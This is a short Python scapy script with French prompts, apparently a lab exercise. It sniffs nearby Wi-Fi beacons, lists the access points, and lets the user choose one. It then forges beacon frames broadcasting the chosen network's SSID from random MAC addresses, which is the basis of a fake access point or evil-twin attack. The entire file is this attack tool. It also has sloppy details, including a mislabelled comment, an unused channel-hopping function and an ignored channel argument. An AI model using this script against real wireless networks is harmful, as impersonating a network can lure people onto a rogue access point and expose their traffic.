from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap

ap_list = {}


def add_network(pkt):
    if pkt.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        essid = pkt[Dot11Elt].info
        # get the name of it
        ssid = pkt[Dot11Elt].info.decode()
        try:
            dbm_signal = pkt.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # extract network stats
        stats = pkt[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        if essid not in ap_list:
            ap_list[essid] = [essid, dbm_signal, channel]


def channel_hop(ch):
    new_ch = (ch + 6) % 12
    return new_ch


def generate_beacon(iface, ssid, ch):
    sender_MAC = RandMAC()
    # 802.11 frame
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_MAC, addr3=sender_MAC)
    bc = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    pkt = RadioTap() / dot11 / bc / essid
    sendp(pkt, iface=iface, loop=2, inter=0.2)


if __name__ == "__main__":
    # interface name
    interface = "wlan0"
    t_out = input("Sniffing timeout: ")
    # start sniffing
    sniff(prn=add_network, iface=interface, timeout=int(t_out))

    cnt = 0
    channels = []
    ssids = []
    print("Liste d'Access point scanned:")
    for i in ap_list:
        cnt += 1
        channels.append(ap_list.get(i)[2])
        ssids.append(ap_list.get(i)[0])
        print(cnt, ap_list.get(i))

    # select target network
    tg_index = int(input("Tapez le numero de la cible : "))
    tg_ch = channels[int(tg_index) - 1]
    tg_ssid = ssids[int(tg_index - 1)]

    generate_beacon(interface, tg_ssid, tg_ch)
